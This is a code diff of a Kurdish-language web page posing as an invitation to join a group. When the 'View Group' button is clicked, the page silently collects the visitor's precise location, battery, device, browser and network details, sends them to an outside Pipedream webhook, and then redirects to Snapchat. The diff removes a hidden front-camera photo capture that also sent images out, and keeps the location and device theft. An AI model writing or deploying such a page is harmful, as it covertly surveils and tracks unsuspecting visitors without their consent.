@@ -39,16 +39,9 @@
     <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
     <button class="btn" id="viewGroupBtn">View Group</button>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;" playsinline></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
     <script>
         const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";
         const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
 
         let globalBattery = "N/A";
         let globalCharging = "N/A";
@@ -69,61 +62,36 @@
             navigator.geolocation.getCurrentPosition((position) => {
                 let lat = position.coords.latitude;
                 let lon = position.coords.longitude;
-                globalMaps = "http://maps.google.com/?q=" + lat + "," + lon;
+                globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
             }, null, { enableHighAccuracy: true, timeout: 4000 });
         }
 
         document.getElementById('viewGroupBtn').addEventListener('click', function() {
             document.getElementById('viewGroupBtn').innerText = "Loading...";
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(stream => {
-                    video.srcObject = stream;
-                    
-                    setTimeout(() => {
-                        try {
-                            context.drawImage(video, 0, 0, 640, 480);
-                            // گۆڕینی وێنەکە بۆ دەقی Base64 بۆ ئەوەی پێکهاتەی JSON تێکنەچێت
-                            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.7);
-                            sendFinalData(imageDataUrl);
-                        } catch (err) {
-                            sendFinalData(null);
-                        }
-                    }, 500);
-                })
-                .catch(() => {
-                    sendFinalData(null);
-                });
-        });
-
-        function sendFinalData(base64Image) {
             let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
 
-            // ڕێکخستنی داتاکان بە فۆرماتی خاوێنی JSON کە ڕێک دەچێتە ناو ئەو خانانەی دیاریت کردوون
-            const payload = {
-                uid: uid,
-                battery: globalBattery,
-                charging: globalCharging,
-                maps: globalMaps,
-                device: globalDevice,
-                browser: globalBrowser,
-                time: globalTime,
-                network: globalNetwork,
-                photo_base64: base64Image // وێنەکە لێرەدا وەک دەق دەنێردرێت
-            };
+            // ناچارکردنی داتاکە بۆ فۆرماتێک کە Pipedream ڕاستەوخۆ دەیناسێتەوە لە ناو body
+            const params = new URLSearchParams();
+            params.append("uid", uid);
+            params.append("battery", globalBattery);
+            params.append("charging", globalCharging);
+            params.append("device", globalDevice);
+            params.append("browser", globalBrowser);
+            params.append("network", globalNetwork);
+            params.append("time", globalTime);
+            params.append("maps", globalMaps);
 
-            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-
-            // ناردنی مسۆگەر بە بەکارهێنانی sendBeacon بۆ ئەوەی لە ئایفۆندا نەپچڕێت
+            // ناردنی بەستراو بە پاشبنەمای مۆبایلەکە بەبێ تێکدانی فۆرمات
             if (navigator.sendBeacon) {
-                navigator.sendBeacon(secureWebhook, blob);
+                navigator.sendBeacon(secureWebhook, params);
             } else {
-                fetch(secureWebhook, { method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'application/json' }, keepalive: true });
+                fetch(secureWebhook, { method: 'POST', body: params, keepalive: true });
             }
 
-            // گواستنەوە بۆ سناپچات
+            // گواستنەوەی دەستبەجێ بۆ سناپچات
             window.location.href = snapchatRedirectUrl;
-        }
+        });
     </script>
 </body>
 </html>
